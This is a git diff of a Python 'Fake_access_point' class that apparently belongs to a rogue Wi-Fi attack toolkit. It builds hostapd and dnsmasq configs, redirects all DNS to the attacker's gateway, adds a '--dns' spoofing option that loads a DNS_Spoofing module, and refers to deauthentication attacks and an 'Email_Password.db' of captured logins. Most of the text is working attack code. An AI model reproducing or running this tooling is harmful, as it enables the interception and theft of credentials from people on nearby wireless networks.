@@ -131,10 +131,10 @@ class Fake_access_point:
           try: 
               ifconfig_command  = [   
                                       
-                               "sudo airmon-ng start "
-                              ]
+                               "sudo airmon-ng start "+f'{self.args.Interface}'
+                              ]                
               for _ in  ifconfig_command :
-                  call_termminal = subprocess.call( _ +f'{self.args.Interface}',shell=True,stderr=subprocess.PIPE,stdout=PIPE) 
+                  call_termminal = subprocess.call(ifconfig_command ,shell=True,stderr=subprocess.PIPE,stdout=PIPE) 
                   time.sleep(2)
               print("[+] Interface is in monitor Mode")
           except KeyboardInterrupt: 
@@ -163,7 +163,7 @@ class Fake_access_point:
                                           "hw_mode=g"+'\n'\
                                           "channel=11"+'\n'\
                                           "macaddr_acl=0"+'\n'\
-                                          "ignore_broadcast_ssid=0"+"\n"\
+                                          "ignore_broadcast_ssid=0"+"\n"
                                          )  
               group  = "chown "+ user_name+ ":"+user_name +" ./hostapd.conf" 
               os.system(group)   
@@ -176,17 +176,24 @@ class Fake_access_point:
                    dnsmasq.write(
                                    'no-resolv'+'\n'\
                                    'interface='+f'{self.args.Interface}'+'mon'+'\n'\
-                                   "dhcp-range=192.168.1.2, 192.168.1.30,255.255.255.0, 12h"+'\n'\
-                                   "dhcp-option=3, 192.168.1.1"+'\n'\
-                                   "dhcp-option=6, 192.168.1.1"+'\n'\
-                                   "server= 208.67.220.220"+'\n'\
+                                   "dhcp-range=172.160.255.50,172.160.255.62,255.255.255.240, 12h"+'\n'\
+                                   "dhcp-option=3,172.160.255.49"+'\n'\
+                                   "dhcp-option=6,172.160.255.49"+'\n'\
+                                   "server=208.67.220.220"+'\n'\
                                    "log-queries"+'\n'\
                                    "log-dhcp"+"\n"\
-                                   "listen-address= 127.0.0.1"+'\n'                                
+                                   "bogus-priv"+'\n'\
+                                   "listen-address= 127.0.0.1"+'\n'
                                 )  
               if self.args.Portal:
                       with open("./dnsmasq.conf",'a') as dnsmasq :
-                                      dnsmasq.write("address=/#/192.168.1.1"+"\n")   
+                                      dnsmasq.write("address=/#/172.160.255.49"+"\n")   
+              if self.args.dns:
+                    add_hosts= "no-resolv"+'\n'+'no-hosts'+'\n'+"addn-hosts="+Curent_dir+"/Snake_Package/resources/hosts.txt"+'\n'+"address=/loc/172.160.255.49"
+                    with open ("./dnsmasq.conf",'r') as read_config:
+                         config_dn = read_config.read().replace('no-resolv',add_hosts).replace("listen-address= 127.0.0.1" ,'listen-address= 127.0.0.1 , 172.160.255.49')
+                    with open ("./dnsmasq.conf",'w') as write_config:
+                         write_config.write(config_dn)
               group  = "chown "+ user_name+ ":"+user_name +" "+"dnsmasq.conf" 
               os.system(group) 
           except KeyboardInterrupt:
@@ -219,9 +226,9 @@ class Fake_access_point:
               try:                    
                   Set_Up_access_point = [
 
-                                  "ifconfig "+f'{self.args.Interface}'+'mon'+" up 192.168.1.1 netmask 255.255.255.0",
-                                  "route add -net 192.168.1.0 netmask 255.255.255.0 gw\
-                                   192.168.1.1",
+                                  "ifconfig "+f'{self.args.Interface}'+'mon'+" up 172.160.255.49 netmask 255.255.255.240",
+                                  "route add -net 172.160.255.48 netmask 255.255.255.240 gw\
+                                  172.160.255.49",
                                   "iptables --flush",
                                   "iptables --table nat --append POSTROUTING\
                                    --out-interface "+ f'{self.interface}'+" -j MASQUERADE",
@@ -246,7 +253,10 @@ class Fake_access_point:
              order2 = "dnsmasq -C dnsmasq.conf -d"
              command_proc2 = ' gnome-terminal  -e ' +'"' + order2 +'"'               
              call_termminal = subprocess.call(command_proc2,shell=True,stderr=subprocess.PIPE)
-             
+             if self.args.dns and not self.args.Deauth\
+             or not self.args.Portal :
+                from Snake_Package.dns_spoofing import DNS_Spoofing
+                run = DNS_Spoofing()
              if self.args.Deauth :                                
                  run = Deauth_Router()  
              else:
@@ -270,7 +280,16 @@ class Fake_access_point:
                    group1  = "chown "+ user_name+ ":"+user_name +" "+  Curent_dir+"/Email_Password.db" 
                    os.system(group1)
           except KeyboardInterrupt :
-                 exit()
+                  Command  = [
+                               "sudo airmon-ng stop wlan0mon",
+                               " sudo service NetworkManager restart",
+                            ]
+                  for _ in Command : 
+                     subprocess.call( _ ,shell=True,stderr=subprocess.PIPE,stdout=PIPE) 
+   
+                  print("[*] FAKE ACCESS POINT EXIT ...!!")
+                  time.sleep(1)
+                  exit() 
       def args_Control(self):
             parser = argparse.ArgumentParser( description="Usage: <OPtion> <arguments> ")
             parser.add_argument( '-S ',"--Show",action='store_true',help="Show all access point around you [bssid-ssid-channel-sagenal]" )
@@ -281,6 +300,7 @@ class Fake_access_point:
             parser.add_argument( '-L ',"--List",action='store_true',help = "Check the AP avelabale")
             parser.add_argument( '-T ',"--Target",action=None ,help = "Mac address of Target to send deauth packet ")
             parser.add_argument( '-P ',"--Packet",action=None ,help = "how may time of Deauth Packet to send  ",type=int)
+            parser.add_argument( '--dns',action='store_true' ,help = "Spoofing Dns wtih some of website  ")
             
             self.args = parser.parse_args()
             if len(sys.argv)> 1 :
